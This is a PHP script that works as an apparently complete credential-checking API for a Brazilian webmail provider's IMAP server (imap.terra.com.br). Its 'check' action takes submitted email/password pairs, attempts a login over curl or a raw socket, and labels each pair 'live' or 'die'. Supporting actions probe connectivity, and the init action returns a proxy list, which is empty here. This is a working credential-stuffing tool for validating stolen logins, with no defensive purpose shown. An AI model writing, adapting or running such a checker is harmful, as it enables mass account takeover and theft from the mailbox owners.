<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('max_execution_time', '20');
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = $_GET['action'] ?? '';

if ($action === 'init') {
    echo json_encode(['status' => 'ok', 'proxies' => []]);
    exit;
}

if ($action === 'test') {
    echo json_encode(['status' => 'ok', 'php' => PHP_VERSION, 'curl' => extension_loaded('curl'), 'openssl' => extension_loaded('openssl'), 'imap' => extension_loaded('imap')]);
    exit;
}

if ($action === 'diag') {
    $r = ['server' => 'imap.terra.com.br', 'php' => PHP_VERSION, 'tests' => []];
    $ips = @gethostbynamel('imap.terra.com.br');
    $r['tests']['dns'] = ['ok' => !empty($ips), 'ips' => $ips ?: []];
    if (empty($ips)) { echo json_encode($r); exit; }
    $t = microtime(true);
    $tcp = @fsockopen($ips[0], 993, $e, $s, 5);
    $r['tests']['tcp_993'] = ['ok' => $tcp !== false, 'ms' => round((microtime(true) - $t) * 1000)];
    if ($tcp === false) $r['tests']['tcp_993']['err'] = "errno={$e}; {$s}"; else fclose($tcp);
    if (extension_loaded('curl')) {
        $ch = curl_init();
        curl_setopt_array($ch, [CURLOPT_URL => 'imaps://imap.terra.com.br:993/', CURLOPT_USERNAME => 'test@terra.com.br', CURLOPT_PASSWORD => 'test123', CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 5, CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_NOSIGNAL => 1]);
        $res = curl_exec($ch);
        $r['tests']['curl'] = ['ok' => $res !== false, 'err' => curl_error($ch), 'errno' => curl_errno($ch)];
        curl_close($ch);
    }
    $r['can_connect'] = ($r['tests']['tcp_993']['ok'] ?? false);
    echo json_encode($r, 128 | 256);
    exit;
}

if ($action === 'check') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($email === '' || $password === '') {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Vazio']);
        exit;
    }
    try {
        echo json_encode(doValidate($email, $password));
    } catch (\Throwable $e) {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Erro: ' . substr($e->getMessage(), 0, 100)]);
    }
    exit;
}

echo json_encode(['status' => 'ok']);
exit;

function doValidate(string $email, string $password): array {
    $timeout = 8;
    if (extension_loaded('curl')) {
        $r = tryCurl($email, $password, $timeout);
        if ($r !== null) return $r;
    }
    $r = trySocket($email, $password, $timeout);
    if ($r !== null) return $r;
    return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed'];
}

function tryCurl(string $email, string $password, int $timeout): ?array {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERNAME => $email,
        CURLOPT_PASSWORD => $password,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => $timeout,
        CURLOPT_NOSIGNAL => 1,
    ]);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    $err = curl_error($ch);
    curl_close($ch);
    if ($errno === 67) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if ($result !== false) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    return null;
}

function trySocket(string $email, string $password, int $timeout): ?array {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) { fclose($socket); return null; }
    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Bad command'];
    return null;
}
